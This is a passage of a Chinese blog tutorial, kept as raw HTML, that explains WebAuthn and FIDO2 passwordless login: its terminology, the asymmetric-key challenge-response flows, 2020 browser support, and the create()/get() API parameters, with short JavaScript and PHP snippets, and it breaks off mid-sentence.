src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 